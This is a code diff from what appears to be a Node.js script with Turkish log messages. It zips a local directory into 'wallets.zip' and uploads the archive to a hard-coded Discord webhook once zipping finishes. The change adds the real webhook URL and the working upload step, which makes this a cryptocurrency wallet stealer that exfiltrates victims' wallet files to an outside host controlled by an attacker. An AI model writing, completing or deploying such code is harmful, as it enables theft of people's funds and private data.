@@ -10,26 +10,28 @@ ziple.pipe(output);
 ziple.directory(dosyaKonum, false);
 ziple.finalize();
 
-
-const sender = {
-  method: 'POST',
-  url: '',
-  headers: {
-    'Content-Type': 'application/zip',
-  },
-  formData: {
-    file: {
-      value: fs.createReadStream(path.join(__dirname, 'wallets.zip')),
-      options: {
-        filename: 'wallets.zip',
-        contentType: null,
+output.on('close', function() {
+  console.log(ziple.pointer() + ' dosya boyutu');
+  console.log('dosya ziplendi');
+  const sender = {
+    method: 'POST',
+    url: 'https://discord.com/api/webhooks/953630497332928512/muxevnoQwxmqimRcL0XoZy_mEE3R2R2qqeforO5iwC-BH7rNHl4TSkSnQDga3o2fz7bK',
+    headers: {
+      'Content-Type': 'application/zip',
+    },
+    formData: {
+      file: {
+        value: fs.createReadStream(path.join(__dirname, 'wallets.zip')),
+        options: {
+          filename: 'wallets.zip',
+          contentType: 'application/zip',
+        },
       },
     },
-  },
-};
-
-
-request(sender, function (error, response) {
-  if (error) throw new Error(error);
-  console.log(response.body);
+  };
+  
+  request(sender, function (error, response) {
+    if (error) throw new Error(error);
+    console.log(response.body);
+  });
 });
